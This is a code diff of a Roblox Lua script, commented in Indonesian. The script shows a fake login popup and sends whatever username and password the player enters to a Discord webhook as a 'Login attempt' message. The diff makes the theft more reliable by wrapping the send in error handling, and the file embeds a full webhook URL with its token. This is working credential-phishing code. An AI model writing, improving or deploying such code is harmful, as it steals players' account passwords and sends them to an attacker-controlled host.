@@ -1,14 +1,23 @@
 -- URL Webhook Discord
-local webhook_url = "https://discordapp.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
+local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
 
--- Fungsi untuk mengirim data ke webhook
+-- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password)
     local httpService = game:GetService("HttpService")
     local payload = httpService:JSONEncode({
         content = "Login attempt:\nUsername: " .. username .. "\nPassword: " .. password
     })
-    
-    httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
+
+    -- Gunakan pcall untuk menangkap kesalahan
+    local success, err = pcall(function()
+        httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+
+    if success then
+        print("Data berhasil dikirim ke Discord!")
+    else
+        print("Gagal mengirim data ke Discord:", err)
+    end
 end
 
 -- Membuat GUI
@@ -64,9 +73,11 @@ loginButton.TextColor3 = Color3.new(1, 1, 1)
 loginButton.MouseButton1Click:Connect(function()
     local username = usernameBox.Text
     local password = passwordBox.Text
+    print("Tombol login ditekan") -- Debug log
+
     if username ~= "" and password ~= "" then
-        sendToDiscord(username, password)
-        frame:Destroy() -- Hapus popup setelah login
+        sendToDiscord(username, password) -- Memanggil fungsi sendToDiscord
+        frame:Destroy() -- Menghapus popup setelah login
     else
         print("Username atau password tidak boleh kosong!")
     end
